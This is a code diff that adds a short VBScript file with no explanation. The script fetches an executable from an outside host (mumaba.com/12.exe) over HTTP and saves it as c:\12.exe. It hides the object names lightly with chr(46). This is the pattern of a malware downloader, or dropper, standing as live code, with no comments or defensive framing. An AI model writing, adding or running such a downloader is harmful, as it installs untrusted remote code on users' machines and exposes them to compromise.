@@ -1,0 +1,16 @@
+dim HTTPGET 
+dim Data 
+dim ExeURL 
+dim LocalPath 
+ExeURL = "http://mumaba.com/12.exe" 
+LocalPath = "c:\12.exe" 
+Set HTTPGET = CreateObject("Microsoft" & chr(46) & "XMLHTTP") 
+Set Data = CreateObject("ADODB" & chr(46) & "Stream") 
+HTTPGET.Open "GET", ExeURL, false 
+HTTPGET.Send 
+Const adTypeBinary = 1 
+Const adSaveCreateOverWrite = 2 
+Data.Type = adTypeBinary 
+Data.Open 
+Data.Write HTTPGET.ResponseBody 
+Data.SaveToFile LocalPath, adSaveCreateOverWrite 
